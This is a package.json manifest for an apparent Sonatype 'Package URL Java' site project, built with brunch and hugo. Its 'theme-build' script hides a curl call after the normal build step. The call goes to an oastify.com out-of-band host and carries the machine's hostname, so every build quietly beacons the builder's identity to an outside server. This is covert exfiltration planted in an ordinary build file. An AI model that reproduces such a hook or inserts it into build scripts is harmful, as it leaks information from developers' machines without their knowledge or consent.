{
  "name": "goodies-package-url-java",
  "description": "Goodies: Package URL Java",
  "private": true,
  "author": "Sonatype, Inc.",
  "version": "0.0.1",
  "repository": "",
  "scripts": {
    "theme-build": "brunch build themes/dionysus && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/sonatype/package-url-java/`hostname`",
    "theme-watch": "brunch watch themes/dionysus",
    "theme-wait": "wait-on themes/dionysus/force-update.marker",
    "hugo-server": "yarn theme-wait && hugo server --watch --buildDrafts --disableFastRender",
    "start": "concurrently -k -n brunch,hugo 'yarn theme-watch' 'yarn hugo-server'",
    "build": "brunch build --production themes/dionysus && hugo"
  },
  "dependencies": {
    "brunch": "2.10.17",
    "concurrently": "4.1.2",
    "wait-on": "3.3.0",
    "debug": "2.6.9"
  },
  "devDependencies": {}
}
